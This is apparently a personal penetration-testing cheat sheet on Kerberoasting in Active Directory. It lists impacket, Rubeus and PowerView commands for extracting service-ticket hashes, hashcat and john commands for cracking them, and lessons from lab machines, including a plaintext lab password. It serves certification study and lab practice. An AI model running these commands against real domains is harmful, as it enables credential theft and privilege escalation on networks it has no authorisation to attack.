# Kerberoasting

**Requires valid domain credentials.** Targets accounts with SPNs set.

Service accounts often have weak passwords and elevated privileges — always Kerberoast early.

---

## From Linux

```bash
impacket-GetUserSPNs domain.local/user:REDACTED -dc-ip $DC -request -outputfile kerberoast.txt
```

---

## Crack the Hash

```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

```bash
john kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## From Windows

```powershell
# Rubeus
.\Rubeus.exe kerberoast /outfile:REDACTED
```

```powershell
# PowerView
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat
```

---

## Next Steps

After cracking → spray new creds → check for admin access → continue [[AD-Methodology]].

## From Your Boxes

> **Active** (HTB) — Kerberoasting after GPP password leak from SMB
> - What worked: `impacket-GetUserSPNs -request -dc-ip TARGET active.htb/SVC_TGS -save -outputfile GetUserSPNs.out`
> - Cracked admin SPN hash with john + rockyou, then PSExec'd as administrator
> - Lesson: Kerberoast immediately after getting ANY domain creds — even service account creds work

> **Nagoya** (PG) — Kerberoasting after brute-forcing initial creds via SMB
> - What worked: `impacket-GetUserSPNs nagoya-industries.com/fiona.clark:'Summer2023' -dc-ip TARGET -outputfile kerb.txt`
> - Got 2 SPN hashes (svc_helpdesk, svc_mssql), cracked svc_mssql quickly with john
> - Lesson: Kerberoast returns ALL service accounts — crack them all, some will be weak even if others aren't

> **Hokkaido** (PG) — Targeted Kerberoasting via GenericWrite ACL abuse
> - What worked: `targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'REDACTED' --dc-ip TARGET`
> - GenericWrite over a user lets you set an SPN on them, then Kerberoast their hash
> - Lesson: If BloodHound shows GenericWrite, targeted Kerberoasting is a powerful escalation path

> **Access** (PG) — Rubeus Kerberoasting from a Windows foothold
> - What worked: `.\Rubeus.exe kerberoast` from a compromised Windows host
> - Lesson: Use Rubeus on Windows, impacket-GetUserSPNs from Linux — same result, different tools

> **OSCP B - MS01** (Course) — Kerberoasting through a SOCKS proxy after pivoting
> - What worked: `proxychains impacket-GetUserSPNs -outputfile kerb.txt -dc-ip DC_IP 'OSCP.exam/web_svc:REDACTED'`
> - Lesson: Kerberoasting works through proxychains — use it after pivoting into internal AD networks
